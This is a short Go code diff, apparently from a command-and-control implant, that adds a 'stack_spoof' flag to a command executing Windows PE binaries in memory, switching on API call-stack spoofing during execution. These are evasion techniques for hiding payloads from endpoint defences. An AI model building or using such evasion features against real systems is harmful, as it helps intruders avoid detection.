@@ -22,6 +22,7 @@ type executeMemoryArgs struct {
 	Arguments  string `json:"arguments"`   // command-line arguments (space-separated)
 	Timeout    int    `json:"timeout"`     // execution timeout in seconds (default: 60)
 	ExportName string `json:"export_name"` // (Windows DLLs) export function to call after DllMain
+	StackSpoof bool   `json:"stack_spoof"`
 }
 
 // ExecuteMemoryCommand executes a PE binary in memory on Windows.
@@ -64,6 +65,11 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 
 	if !isValidPE(binaryData) {
 		return errorResult("Error: not a valid PE binary (missing MZ/PE signature)")
+	}
+
+	if args.StackSpoof {
+		SetAPISpoofEnabled(true)
+		defer SetAPISpoofEnabled(false)
 	}
 
 	timeout := args.Timeout
